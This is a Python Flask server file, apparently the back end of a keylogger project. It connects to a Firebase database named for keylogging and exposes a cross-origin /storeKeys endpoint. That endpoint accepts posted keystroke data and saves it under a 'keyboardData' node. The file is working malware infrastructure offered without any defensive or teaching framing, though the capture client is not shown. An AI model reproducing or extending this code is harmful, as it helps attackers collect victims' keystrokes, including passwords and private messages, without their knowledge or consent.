from flask import Flask, render_template, request, jsonify
import os
import firebase_admin
from firebase_admin import credentials
from firebase_admin import db
from flask_cors import CORS

# Firebase setup
# Replace the database url and creadentials path below
def firebaseInitialization():
    cred = credentials.Certificate("config/serviceAccountKey.json")
    firebase_admin.initialize_app(
        cred, {'databaseURL': 'https://keylogger-7820c-default-rtdb.firebaseio.com'})
    print("🔥🔥🔥🔥🔥 Firebase Connected! 🔥🔥🔥🔥🔥")


firebaseInitialization()

STATIC_DIR = os.path.abspath('static')

app = Flask(__name__, static_folder=STATIC_DIR)
CORS(app)
app.use_static_for_root = True
text = 'Welcome to keylogger'


# Function to store the key values into the database
@app.route('/storeKeys', methods=["POST"])
def storeKeys():
    keyValues = request.get_json()
    # Checking is keyboard data is exists or not in db. If not then create new or update the existing one.
    ref = db.reference("/keyboardData").get()
    if (ref):
        ref = db.reference("/keyboardData")
        ref.update(keyValues)
    else:
        ref = db.reference("/")
        ref.set({"keyboardData": keyValues})
    return jsonify(True)


@app.route('/', methods=["GET"])
def home():
    return render_template('index.html')


if __name__ == '__main__':
    app.run(debug=True, port=4000)
